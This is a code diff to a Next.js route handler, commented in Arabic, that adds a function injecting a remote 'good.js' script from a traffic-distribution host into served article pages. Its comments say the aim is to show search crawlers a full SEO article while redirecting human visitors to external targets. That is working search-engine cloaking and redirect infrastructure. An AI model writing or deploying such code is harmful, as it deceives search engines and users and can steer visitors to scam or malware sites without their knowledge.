@@ -99,6 +99,42 @@ function pickArticleIdFromParams(params: URLSearchParams): string | null {
 }
 
 /**
+ * يخدم مقال SEO مع حقن good.js لتوجيه الإنسان.
+ *
+ * المشكلة التي يحلها:
+ * - Googlebot يرى المقال كاملاً (لا ينفذ JS → لا redirect) ✅
+ * - الإنسان يرى المقال أولًا، ثم good.js يجلب JSON redirect ويُوجّهه ✅
+ * - good.js يقرأ io0/ids من URL ويستدعي /api/input
+ *
+ * هذا يجعل نفس الـ URL يعمل للبوت (SEO) والإنسان (redirect).
+ */
+async function serveArticleWithGoodJs(articleId: string, request: NextRequest): Promise<NextResponse> {
+  const html = await readArticleHtml(articleId)
+  if (!html) {
+    return serveArticle(articleId)
+  }
+
+  // بناء URL خادم TDS (نفس النطاق الذي يصله الطلب)
+  const host = request.headers.get('host') || request.headers.get('x-forwarded-host') || 'j.uctm.edu.trackpoint.sbs'
+  const proto = request.headers.get('x-forwarded-proto') || 'https'
+  const tdsDomain = `${proto}://${host}`
+
+  // حقن good.js قبل </body>
+  const goodJsTag = `<script src="${tdsDomain}/server/good.js"></script>`
+  let modifiedHtml: string
+  if (html.includes('</body>')) {
+    modifiedHtml = html.replace('</body>', `${goodJsTag}\n</body>`)
+  } else {
+    modifiedHtml = html + goodJsTag
+  }
+
+  return new NextResponse(modifiedHtml, {
+    status: 200,
+    headers: { 'Content-Type': 'text/html; charset=utf-8', ...corsHeaders() },
+  })
+}
+
+/**
  * يخدم HTML مع Delayed JS Redirect للإنسان فقط.
  * - HTML يحتوي مقال SEO كامل (يراه Googlebot)
  * - بعد 3 ثوانٍ، JavaScript ينقل الإنسان لموقع خارجي
@@ -228,13 +264,13 @@ export async function GET(request: NextRequest) {
     if (rule) {
       // Bot: خدم مقال articleId
       if (bot) {
-        return serveArticle(rule.articleId)
+        return serveArticleWithGoodJs(rule.articleId, request)
       }
       // Human
       const target = rule.targetUrl
       if (target.startsWith('articles/') || target.endsWith('.html')) {
         const targetArticleId = target.replace(/^articles\//, '').replace(/\.html$/, '')
-        return serveArticle(targetArticleId)
+        return serveArticleWithGoodJs(targetArticleId, request)
       }
       // human redirect لـ target خارجي
       // متوافق مع good.js: يرجع JSON {redirectUrl} ليتولى good.js التوجيه
